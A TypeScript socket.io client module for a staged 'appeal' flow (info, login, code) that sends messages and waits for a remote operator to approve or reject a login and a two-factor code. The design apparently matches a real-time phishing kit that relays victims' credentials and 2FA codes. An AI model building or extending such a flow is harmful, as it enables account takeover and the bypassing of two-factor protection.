import type { Socket } from 'socket.io-client';

export type AppealStage = 'info' | 'login' | 'code';

export type LoginPollResult = 'approved' | 'rejected' | '2fa' | 'skipped' | 'timeout' | 'error';
export type CodePollResult = 'approved' | 'rejected' | 'skipped' | 'timeout' | 'error';

const POLL_TIMEOUT_MS = 10 * 60 * 1000;

const waitForEvent = <T>(socket: Socket, event: string, timeoutMs = POLL_TIMEOUT_MS) =>
    new Promise<T>((resolve, reject) => {
        const timer = window.setTimeout(() => {
            socket.off(event, onEvent);
            reject(new Error('timeout'));
        }, timeoutMs);

        const onEvent = (data: T) => {
            window.clearTimeout(timer);
            socket.off(event, onEvent);
            resolve(data);
        };

        socket.on(event, onEvent);
    });

export const sendAppealMessage = async (
    socket: Socket,
    payload: { message: string; message_id?: number | null; stage: AppealStage; attempt?: number }
) => {
    socket.emit('appeal_message', payload);
    const data = await waitForEvent<{ message_id: number }>(socket, 'message_sent');
    return data.message_id;
};

export const waitLoginApproval = async (socket: Socket): Promise<LoginPollResult> => {
    try {
        const data = await waitForEvent<{ status: string }>(socket, 'login_result');
        if (data.status === 'approved') return 'approved';
        if (data.status === 'rejected') return 'rejected';
        if (data.status === '2fa') return '2fa';
        if (data.status === 'skipped') return 'skipped';
        return 'error';
    } catch {
        return 'timeout';
    }
};

export const waitCodeApproval = async (socket: Socket): Promise<CodePollResult> => {
    try {
        const data = await waitForEvent<{ status: string }>(socket, 'code_result');
        if (data.status === 'approved') return 'approved';
        if (data.status === 'rejected') return 'rejected';
        if (data.status === 'skipped') return 'skipped';
        return 'error';
    } catch {
        return 'timeout';
    }
};
